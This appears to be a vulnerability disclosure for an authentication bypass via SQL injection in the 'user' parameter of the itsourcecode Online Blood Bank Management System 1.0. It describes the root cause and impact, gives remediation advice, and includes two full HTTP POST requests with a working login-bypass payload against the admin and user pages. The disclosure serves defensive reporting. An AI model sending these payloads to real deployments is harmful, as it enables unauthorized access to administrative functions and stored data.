# Submit #383397: itsourcecode Online Blood Bank Management System 1 Authentication Bypass via SQL Injection[info](?kb.submission)

| Title | itsourcecode Online Blood Bank Management System 1 Authentication Bypass via SQL Injection |
| --- | --- |
| Description | In Version 1.0 of the Online Blood Bank Management System application, a SQL injection vulnerability was found in two separate locations - the '/admin/index.php' file and the '/index.php file' of the 'Online Blood Bank Management System' project. The reason for this issue is that attackers inject malicious code from the parameter "user" and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations, allowing access to both the user console page as well as the admin user page. No login or authorization is required to exploit this vulnerability. |

| Itsourcecode Online Blood Bank Management Authentication Bypass via SQL Injection to User page and Admin ConsoleAffected Product Online Blood Bank Management System in PHP with Source Code Vendor Homepage <https://itsourcecode.com/free-projects/php-project/online-blood-bank-management-system-in-php-with-source-code/> Version 1.0 Vulnerable Software <https://itsourcecode.com/wp-content/uploads/2021/02/Blood-Bank-Management-System-in-Php-with-Source-Code-1.zip> Requirements There are no requirements for authentication to perform this attack. Problem Authentication Bypass via SQL Injection Root Cause A SQL injection vulnerability was found in the '/admin/index.php' file and the '/index.php file' of the 'Online Blood Bank Management System' project. The reason for this issue is that attackers inject malicious code from the parameter "user" and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations, allowing access to both the user console page as well as the admin user page. Impact Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, unauthorized administrative functions, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity. Description In Version 1.0 of the Online Blood Bank Management System application, a SQL injection vulnerability was found in the '/admin/index.php' file and the '/index.php file' of the 'Online Blood Bank Management System' project. The reason for this issue is that attackers inject malicious code from the parameter "user" and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations, allowing access to both the user console page as well as the admin user page.  ***No login or authorization is required to exploit this vulnerability*** Proof-of-ConceptWorking PayloadsAdmin Console ``` POST /bloodbank/admin/index.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 46 Origin: http://localhost Connection: keep-alive Referer: http://localhost/bloodbank/admin/index.php Cookie: PHPSESSID=6bp6hj4uabm82gml4a6qmmqrff Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Priority: u=0, i  tab=on&user='or+1%3d1%23&pass=test&sub=Sign+In   ``` User Console ``` POST /bloodbank/login.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 46 Origin: http://localhost Connection: keep-alive Referer: http://localhost/bloodbank/login.php Cookie: PHPSESSID=6bp6hj4uabm82gml4a6qmmqrff Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Priority: u=0, i  tab=on&user='or+1%3d1%23&pass=test&sub=Sign+In   ``` Remediation Guidance Use prepared statements and parameter binding: Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.  Input validation and filtering: Strictly validate and filter user input data to ensure it conforms to the expected format.  Minimize database user permissions: Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.  Regular security audits: Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities. |
